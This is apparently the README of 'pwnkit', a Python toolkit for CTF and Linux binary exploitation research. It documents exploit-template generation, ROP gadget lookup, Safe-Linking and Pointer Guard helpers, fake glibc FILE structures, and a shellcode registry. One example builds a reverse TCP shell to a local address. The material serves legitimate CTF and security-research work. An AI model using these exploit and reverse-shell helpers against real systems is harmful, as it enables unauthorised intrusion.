# pwnkit

[![PyPI version](https://img.shields.io/pypi/v/pwnkit.svg)](https://pypi.org/project/pwnkit/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![Python Versions](https://img.shields.io/pypi/pyversions/pwnkit.svg)](https://pypi.org/project/pwnkit/)

Exploitation toolkit for pwn CTFs & Linux binary exploitation research.  
Includes exploit templates, I/O helpers, ROP gadget mappers, pointer mangling utilities, curated shellcodes, exploit gadgets, House of Maleficarum, gdb/helper scripts, etc.

---

## Installation

From [PyPI](https://pypi.org/project/pwnkit/):

**Method 1**. Install into **current Python environment** (could be system-wide, venv, conda env, etc.). use it both as CLI and Python API:

```bash
pip install pwnkit
```

**Method 2**. Install using `pipx` as standalone **CLI tools**:

```bash
pipx install pwnkit
```

**Method 3.** Install from source (dev):

```bash
git clone https://github.com/4xura/pwnkit.git
cd pwnkit
#
# Edit source code
#
pip install -e .
```

---

## Quick Start

### CLI

All options:
```bash
pwnkit -h
```
Create an exploit script template:
```bash
# local pwn
pwnkit xpl.py --file ./pwn --libc ./libc.so.6 

# remote pwn
pwnkit xpl.py --file ./pwn --host 10.10.10.10 --port 31337

# Override default preset with individual flags
pwnkit xpl.py -f ./pwn -i 10.10.10.10 -p 31337 -A aarch64 -E big

# Minimal setup to fill up by yourself
pwnkit xpl.py
```
Example using default template:
```bash
$ pwnkit exp.py -f ./evil-corp -l ./libc.so.6 \
                -A aarch64 -E big \
                -a john.doe -b https://johndoe.com
[+] Wrote exp.py (template: pkg:default.py.tpl)

$ cat exp.py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# Title : Linux Pwn Exploit
# Author: john.doe - https://johndoe.com
#
# Description:
# ------------
# A Python exploit for Linux binex interaction
#
# Usage:
# ------
# - Local mode  : python3 xpl.py
# - Remote mode : python3 [ <IP> <PORT> | <IP:PORT> ]
#

from pwnkit import *
from pwn import *
import sys

BIN_PATH   = '/home/Axura/ctf/pwn/linux-user/evilcorp/evil-corp'
LIBC_PATH  = '/home/Axura/ctf/pwn/linux-user/evilcorp/libc.so.6'
elf        = ELF(BIN_PATH, checksec=False)
libc       = ELF(LIBC_PATH) if LIBC_PATH else None
host, port = parse_argv(sys.argv[1:], None, None)	# default local mode 

Context(
    arch      = 'aarch64',
    os        = 'linux',
    endian    = 'big',
    log_level = 'debug',
    terminal  = ('tmux', 'splitw', '-h')	# remove when no tmux sess
).push()

io = Tube(
    file_path = BIN_PATH,
    libc_path = LIBC_PATH,
    host      = host,
    port      = port,
    env       = {}
).init().alias()
set_global_io(io)  # s, sa, sl, sla, r, ru, uu64

init_pr("debug", "%(asctime)s - %(levelname)s - %(message)s", "%H:%M:%S")

def xpl():

    # exploit chain here

    io.interactive()

if __name__ == "__main__":
    xpl()
```
List available built-in templates:
```bash
$ pwnkit -lt
[*] Bundled templates:
   - default
   - full
   - got
   - heap
   - minimal
   - ret2libc
   - ret2syscall
   - setcontext
   - srop
   ...
```
Use a built-in template:
```bash
pwnkit exp.py -t heap
```

### Python API

We can use `pwnkit` as Python API, by import the project as a Python module.

Using the pwnkit CLI introduced earlier, we generate a ready-to-use exploit template that automatically loads the target binaries:

```py 
from pwnkit import *
from pwn import *

# - Loading (can be created by pwnkit cli)
BIN_PATH   = './vuln'
LIBC_PATH  = './libc.so.6'
elf        = ELF(BIN_PATH, checksec=False)
libc       = ELF(LIBC_PATH) if LIBC_PATH else None
host, port = parse_argv(sys.argv[1:], None, None)	

io = Tube(
    file_path = BIN_PATH,
    libc_path = LIBC_PATH,
    host      = host,
    port      = port,
    env       = {}
).init()

# This enable alias for: s, sa, sl, sla, r, ru, uu64
io.alias()
"""
[*] Example usage:
io.sla(b'\n', 0xdeadbeef)
"""

# This enables minimal shortcuts
set_global_io(io) 
"""
[*] Example usage:
ru(b'\n')
payload = 0xdeadbeef
s(payload)
"""
```

#### Context Initialization

The first step is to initialize the exploitation context:

```py
Context(
    arch	  = "amd64"
    os		  = "linux"
    endian	  = "little"
    log_level = "debug"
    terminal  = ("tmux", "splitw", "-h")	# remove when no tmux
).push()
```

Or we can use the preset built-in contexts:

```py
ctx = Context.preset("linux-amd64-debug")
ctx.push()
```

A few preset options:

```
linux-amd64-debug
linux-amd64-quiet
linux-i386-debug
linux-i386-quiet
linux-arm-debug
linux-arm-quiet
linux-aarch64-debug
linux-aarch64-quiet
freebsd-amd64-debug
freebsd-amd64-quiet
...
```

#### ROP Gadgets

To leverage ROP gadgets, we first need to disclose the binary’s base address when it is dynamically linked, PIE enabled or ASLR in effect. For example, when chaining gadgets from `libc.so.6`, leak libc base:

```py
...
libc_base = 0x???
libc.address = libc_base
```

At this stage, with the `pwnkit` module, we are able to:

```py
ggs 	= ROPGadgets(libc)
p_rdi_r = ggs['p_rdi_r']
p_rsi_r = ggs['p_rsi_r']
p_rax_r = ggs['p_rax_r']
p_rsp_r = ggs['p_rsp_r']
p_rdx_rbx_r = ggs['p_rdx_rbx_r']
leave_r = ggs['leave_r']
ret 	= ggs['ret']
ggs.dump()  # dump all gadgets to stdout
```

The `dump()` method in the `ROPGadget` class allows us to validate gadget addresses dynamically at runtime:

![dump](images/ROPGadgets_dump.jpg)

#### Pointer Protection

In newer glibc versions, singly linked pointers (e.g., the `fd` pointers of tcache and fastbin chunks) are protected by Safe-Linking. The `SafeLinking` class can be used to perform the corresponding encrypt/decrypt operations:

```py
# e.g., after leaking heap_base for tcache
slk = SafeLinking(heap_base)
fd = 0x55deadbeef
enc_fd = slk.encrypt(fd)
dec_fd = slk.decrypt(enc_fd)

# Verify
assert fd == dec_fd
```

And the Pointer Guard mechanism applies to function pointers and C++ vtables, introducing per-process randomness to protect against direct overwrites. After leaking or overwriting the guard value, the `PointerGuard` class can be used to perform the required mangle/detangle operations:

```py
guard = 0xdeadbeef	# leak it or overwrite it
pg = PointerGuard(guard)
ptr = 0xcafebabe
enc_ptr = pg.mangle(ptr)
dec_ptr = pg.demangle(enc_ptr)

# Verify
assert ptr == dec_ptr
```

#### Shellcode Generation

The `pwnkit` module also provides a shellcode generation framework. It comes with a built-in registry of ready-made payloads across architectures, along with flexible builders for crafting custom ones. Below are some examples of listing, retrieving, and constructing shellcode:

```py
# 1) List all built-in available shellcodes
for name in list_shellcodes():
    print(" -", name)
    
print("")

# 2) Retrieve by arch + name, default variant (min)
sc = ShellcodeReigstry.get("amd64", "execve_bin_sh")
print(f"[+] Got shellcode: {sc.name} ({sc.arch}), {len(sc.blob)} bytes")
print(hex_shellcode(sc.blob))   # output as hex

print("")

sc.dump()   # pretty dump

print("")

# 3) Retrieve explicit variant
sc = ShellcodeReigstry.get("i386", "execve_bin_sh", variant=33)
print(f"[+] Got shellcode: {sc.name} ({sc.arch}), {len(sc.blob)} bytes")
print(hex_shellcode(sc.blob))

print("")

# 4) Retrieve via composite key
sc = ShellcodeReigstry.get(None, "amd64:execveat_bin_sh:29")
print(f"[+] Got shellcode: {sc.name}")
print(hex_shellcode(sc.blob))

print("")

# 5) Fuzzy lookup
sc = ShellcodeReigstry.get("amd64", "ls_")
print(f"[+] Fuzzy match: {sc.name}")
print(hex_shellcode(sc.blob))

print("")

# 6) Builder demo: reverse TCP shell (amd64)
builder = ShellcodeBuilder("amd64")
rev = builder.build_reverse_tcp_shell("127.0.0.1", 4444)
print(f"[+] Built reverse TCP shell ({len(rev)} bytes)")
print(hex_shellcode(rev))
```

Example output:

![shellcode](images/shellcode.jpg)

#### IO FILE Exploit

The `pwnkit` module also provides a helper for targeting glibc’s internal `_IO_FILE_plus` structures. The `IOFilePlus` class allows us to conveniently craft fake FILE objects:

```py
# By default, it honors `context.bits` to decide architecture
# e.g., we set Context(arch="amd64")
f = IOFilePlus()

# Or, we can specify one
f = IOFilePlus("i386")
```

Iterate fields of the FILE object:

```py
for field in f.fields:	# or f.iter_fileds()
    print(field)
```

Inspect its members offsets, names and sizes:

![iofile_fields](images/iofile_fields.jpg)

Set FILE members via names or aliases:

```py
# Use aliases
f.flags      = 0xfbad1800
f.write_base = 0x13370000
f.write_ptr  = 0x13370040
f.mode       = 0
f.fileno     = 1
f.chain      = 0xcafebabe
f.vtable     = 0xdeadbeef

# Also honors original glibc naming
f._flags = 0xfbad1800
f._IO_write_base = 0x13370000
```

We can also use the built-in `set()` method:

```py
# Set field via name 
f.set('_lock', 0x41414141)

# Set via a specific offset
f.set(116, 0x42424242)	# _flags2
```

Inspect the resulting layout in a structured dump for debugging:

```py
f.dump()

# Custom settings
f.dump(
    title = "your title",
    only_nonzero = True,		# default: False, so we also check Null slots
    show_bytes = True,			# default: True, "byte" column displayed
    highlight_ptrs = True,		# default: True, pointer members are highlighted
    color = True,				# default: True, turn off if you don't want colorful output
)
```

Dumping them in a pretty and readable format to screen:

![iofile_dump](images/iofile_dump.jpg)

Use the built-in `get()` method to retrieve a field value:

```py
# retrieve via name
vtable = f.get("vtable")

# via offset
vtable = f.get(0xd8)
```

Create a snapshot:

```py
snapshot = f.bytes	# or: f.to_bytes()

# Or use the `data` bytearray class member
snapshot2 = f.data

print(f"[+] IO FILE snapshot in bytes:\n{snapshot}\n{snapshot2})
```

![iofile_bytes](images/iofile_bytes.jpg)

Create an `IOFilePlus` object by importing a snapshot:

```py
f2 = IOFilePlus.from_bytes(blob=snapshot, arch="amd64")
```

> For example, we can dump an `IO_FILE_plus` structure data via pwndbg's `dump memory` command

---

## Custom Templates

Templates (`*.tpl` or `*.py.tpl`) are rendered with a context dictionary.
Inside your template file you can use Python format placeholders (`{var}`) corresponding to:

 | Key           | Meaning                                                      |
 | ------------- | ------------------------------------------------------------ |
 | `{arch}`      | Architecture string (e.g. `"amd64"`, `"i386"`, `"arm"`, `"aarch64"`) |
 | `{os}`        | OS string (currently `"linux"` or `"freebsd"`)               |
 | `{endian}`    | Endianness (`"little"` or `"big"`)                           |
 | `{log}`       | Log level (e.g. `"debug"`, `"info"`)                         |
 | `{term}`      | Tuple of terminal program args (e.g. `("tmux", "splitw", "-h")`) |
 | `{file_path}` | Path to target binary passed with `-f/--file`                |
 | `{libc_path}` | Path to libc passed with `-l/--libc`                         |
 | `{host}`      | Remote host (if set via `-i/--host`)                         |
 | `{port}`      | Remote port (if set via `-p/--port`)                         |
 | `{io_line}`   | Pre-rendered code line that initializes the `Tube`           |
 | `{author}`    | Author name from `-a/--author`                               |
 | `{blog}`      | Blog URL from `-b/--blog`                                    |

Use your own custom template (`*.tpl` or `*.py.tpl`):
```bash
pwnkit exp.py -t ./mytpl.py.tpl
```
Or put it in a directory and point `PWNKIT_TEMPLATES` to it:
```bash
export PWNKIT_TEMPLATES=~/templates
pwnkit exploit.py -t mytpl
```
For devs, you can also place your exploit templates (which is just a Python file of filename ending with `tpl` suffix) into [`src/pwnkit/templates`](https://github.com/4xura/pwnkit/tree/main/src/pwnkit/templates), before cloning and building to make a built-in. You are also welcome to submit a custom template there in this repo for a pull request!

---

## TODO

* Move the template feature under mode `template`
* Create other modes (when needed)
* Fill up built-in exploit tempaltes
* More Python exloit modules, e.g., decorators, heap exploit, etc.

